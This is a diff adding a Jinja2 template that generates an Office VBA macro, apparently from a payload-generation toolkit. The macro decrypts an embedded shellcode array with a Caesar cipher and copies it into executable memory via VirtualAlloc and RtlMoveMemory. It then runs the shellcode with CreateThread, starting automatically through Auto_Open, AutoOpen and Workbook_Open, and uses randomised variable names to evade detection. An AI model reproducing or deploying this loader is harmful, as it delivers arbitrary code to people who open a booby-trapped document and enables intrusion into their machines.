@@ -1,0 +1,49 @@
+{# print.jinja #}
+{# 
+    This Jinja2 template includes a visual basic script
+    loading raw assembly into memory, then creating a
+    new thread using CreateThread() API function.
+#}
+#If VBA7 Then
+    Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal Myfdg As Long, ByVal Axqqrhrv As Long, ByVal Xew As LongPtr, Rzxil As Long, ByVal Yjfbtzdlv As Long, Mdl As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal Hojeu As Long, ByVal Rvnurt As Long, ByVal Xwxieud As Long, ByVal Hbnie As Long) As LongPtr
+    Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal Tpzjojfv As LongPtr, ByRef Hgg As Any, ByVal Wwttukzor As Long) As LongPtr
+    Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+#Else
+    Private Declare Function CreateThread Lib "KERNEL32" (ByVal Myfdg As Long, ByVal Axqqrhrv As Long, ByVal Xew As Long, Rzxil As Long, ByVal Yjfbtzdlv As Long, Mdl As Long) As Long
+    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal Hojeu As Long, ByVal Rvnurt As Long, ByVal Xwxieud As Long, ByVal Hbnie As Long) As Long
+    Private Declare Function RtlMoveMemory Lib "KERNEL32" (ByVal Tpzjojfv As Long, ByRef Hgg As Any, ByVal Wwttukzor As Long) As Long
+    Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+#End If
+
+Function Auto_Open()
+    Dim Minegn As Long, Trvr As Variant, Zicyuoqc As Long
+#If VBA7 Then
+    Dim Ooa As LongPtr, Pquqsigk As LongPtr
+#Else
+    Dim Ooa As Long, Pquqsigk As Long
+#End If
+
+    Dim t1 As Date
+    Dim t2 As Date
+    Dim time As Long
+    
+    Trvr = Array({{ ciphertext }})
+
+    {% include "vba/decrypt/caesar-native.jinja" %}
+
+    Ooa = VirtualAlloc(0, UBound(Trvr), &H1000, &H40)
+    For Zicyuoqc = LBound(Trvr) To UBound(Trvr)
+        Minegn = Trvr(Zicyuoqc)
+        Pquqsigk = RtlMoveMemory(Ooa + Zicyuoqc, Minegn, 1)
+    Next Zicyuoqc
+    Pquqsigk = CreateThread(0, 0, Ooa, 0, 0, 0)
+End Function
+
+Sub AutoOpen()
+    Auto_Open
+End Sub
+
+Sub Workbook_Open()
+    Auto_Open
+End Sub
